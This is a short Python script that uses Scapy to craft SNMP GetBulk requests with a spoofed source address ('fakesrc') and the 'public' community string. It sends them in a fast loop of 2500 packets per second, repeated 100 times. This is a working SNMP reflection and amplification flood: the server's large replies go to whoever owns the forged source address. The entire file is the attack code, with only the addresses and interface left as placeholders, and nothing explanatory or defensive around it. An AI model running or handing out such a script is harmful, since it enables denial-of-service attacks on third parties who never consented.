from scapy.all import *
fakesrc = 'x.x.x.x'
server = 'x.x.x.x'
device = 'xxx'
snmpver = 'v2c'
snmpcomm = 'public'

mypacket = IP(src=fakesrc, dst=server)/UDP(sport=161, dport=161)/SNMP(version=snmpver, community=snmpcomm, PDU=SNMPbulk(id=RandNum(1,200000000),max_repetitions=10,varbindlist=[SNMPvarbind(oid=ASN1_OID('1.3.6.1.2.1.1.1')),SNMPvarbind(oid=ASN1_OID('1.3.6.1.2.1.1.9.1.3')),SNMPvarbind(oid=ASN1_OID('1.3.6.1.2.1.1.1')),SNMPvarbind(oid=ASN1_OID('1.3.6.1.2.1.1.9.1.3')),SNMPvarbind(oid=ASN1_OID('1.3.6.1.2.1.1.1')),SNMPvarbind(oid=ASN1_OID('1.3.6.1.2.1.1.9.1.3'))]))
l2packet = Ether()/mypacket

sendpfast( l2packet*2500, pps=2500, loop=100, iface=device, file_cache=True )
